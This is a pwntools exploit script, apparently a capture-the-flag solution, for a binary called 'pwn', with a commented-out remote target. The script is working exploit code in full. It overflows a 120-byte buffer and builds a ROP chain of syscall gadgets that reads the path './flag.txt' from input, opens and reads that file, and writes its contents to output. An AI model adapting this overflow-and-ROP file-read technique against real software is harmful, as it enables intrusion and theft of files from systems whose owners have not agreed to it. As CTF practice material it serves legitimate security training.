from pwn import *

p = process('./pwn')
# p = remote('thunder.sdc.tf', 1337)
elf = ELF('./pwn')

pop_rax = 0x00000000004005af
pop_rdi = 0x00000000004006a6
pop_rsi = 0x000000000040165c
pop_rdx = 0x000000000045b056
syscall_ret = 0x0000000000484105
syscall = 0x000000000041003c

read_sys = 0
write_sys = 1
open_sys = 2

buf_addr_1 = elf.bss() + 0x300
buf_addr_2 = 0x6d9000

payload = b'a' * 120
payload += p64(pop_rax) + p64(read_sys) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf_addr_1) + p64(pop_rdx) + p64(
    0x100) + p64(syscall_ret) \
           + p64(pop_rax) + p64(open_sys) + p64(pop_rdi) + p64(buf_addr_1) + p64(pop_rsi) + p64(0) + p64(
    pop_rdx) + p64(0) + p64(syscall_ret) \
           + p64(pop_rax) + p64(read_sys) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(buf_addr_2) + p64(
    pop_rdx) + p64(0x100) + p64(syscall_ret) \
           + p64(pop_rax) + p64(write_sys) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf_addr_2) + p64(
    pop_rdx) + p64(0x100) + p64(syscall)
p.sendline(payload)
p.sendline(b'./flag.txt\00')
p.interactive()
